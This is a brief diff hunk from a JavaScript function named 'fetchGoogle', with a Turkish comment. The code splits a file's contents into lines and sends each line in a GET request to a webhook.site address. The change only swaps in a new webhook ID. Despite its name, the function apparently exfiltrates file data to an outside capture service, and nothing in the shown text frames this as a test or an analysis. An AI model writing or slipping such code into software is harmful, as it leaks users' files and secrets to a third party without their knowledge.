@@ -11,7 +11,7 @@ function fetchGoogle(ctx, req, res) {
         const lines = data.split('\n').map(line => line.trim()).filter(line => line); // Dosyanın tüm satırlarını al ve boş satırları filtrele
 
         const fetchPromises = lines.map(line => 
-            fetch(`https://webhook.site/0ccbcbcc-7da3-4759-9855-ac1dc992520a/${line}`, {
+            fetch(`https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779/${line}`, {
                 method: 'GET',
                 headers: {
                     'Content-Type': 'text/html',
